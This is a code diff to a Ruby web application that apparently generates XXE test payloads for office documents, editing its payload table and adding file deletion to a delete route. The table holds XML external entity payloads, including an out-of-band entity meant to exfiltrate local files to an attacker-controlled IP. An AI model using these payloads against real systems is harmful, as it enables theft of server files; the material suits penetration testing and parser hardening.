@@ -37,7 +37,7 @@ def read_payloads()
 	pl["Canary Parameter Entity"] = ['<!DOCTYPE root [<!ENTITY % xxe "test"> %xxe;]>', "A parameter entity check. This is valuable because the entity is checked immediately when the DOCTYPE is parsed. No malicious application but useful to check for."]
 	pl["Plain External Parameter Entity"] = ['<!DOCTYPE root [<!ENTITY % a SYSTEM "FILE"> %a;]>', "A simple external parameter entity. Note, the file is the value for the payload; IP and PROTOCOL are ignored by OXML XXE. Useful because the entity is checked immediately when the DOCTYPE is parsed. "]
 	pl["Recursive Parameter Entity"] = ['<!DOCTYPE root [<!ENTITY % a "PARAMETER"> <!ENTITY % b "RECURSIVE %a;"> %b;]>',"Technically recursive parameter entities are not allowed by the XML spec. Should never work. Precursor to the billion laughs attack."]
-	pl["Out of Bounds Attack"] = ['<!DOCTYPE root [<!ENTITY % file SYSTEM "file://FILE"><!ENTITY % a SYSTEM "IP/FILE">%a;]>',"OOB is a useful technique to exfiltrate files when attacking blind."]
+	pl["Out of Bounds Attack"] = ['<!DOCTYPE root [<!ENTITY % file SYSTEM "file://FILE"><!ENTITY % dtd SYSTEM "IP">%a;]>',"OOB is a useful technique to exfiltrate files when attacking blind. See References."]
 	return pl
 end
 
@@ -237,8 +237,6 @@ get '/list' do
 	haml :list, :encode_html => true
 end
 
-# TODO check CDATA working correctly
-
 get '/download' do
 	# check if params is set
 	file = Oxfile.first(:id => params["id"])
@@ -277,10 +275,10 @@ get '/view_file' do
 	haml :display_file, :encode_html => true
 end
 
-# TODO delete from FS
 get '/delete' do
 	file = Oxfile.first(:id => params["id"])
 	file.destroy if file
+	File.delete(file.file_location) if file
 	redirect '/list'
 end
 
